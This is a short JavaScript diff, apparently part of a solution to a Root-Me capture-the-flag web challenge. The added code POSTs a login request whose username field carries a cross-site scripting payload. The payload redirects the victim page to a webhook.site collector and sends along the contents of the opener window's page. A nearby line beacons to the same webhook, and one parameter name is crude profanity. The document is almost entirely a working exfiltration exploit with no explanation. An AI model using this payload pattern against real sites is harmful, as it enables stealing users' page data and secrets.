@@ -18,6 +18,12 @@
     window.opener.postMessage({redirect: "go"}, "*");
 
     new Image().src='https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?g6g='+'step4';
+
+    fetch("http://challenge01.root-me.org:58003/login", {
+        method: "POST",
+        body: `username=%3cscript>document.location='https://webhook.site/339f0497-f8d9-43af-9508-3b65ed3f0873?RESULTMOTHERFOCKER='+encodeURI(window.opener.document.querySelectorAll('section>p')[2].innerHTML);%3c/script>`
+            +`&secret=FAILED `
+    });
     document.querySelector("form").submit();
 
 
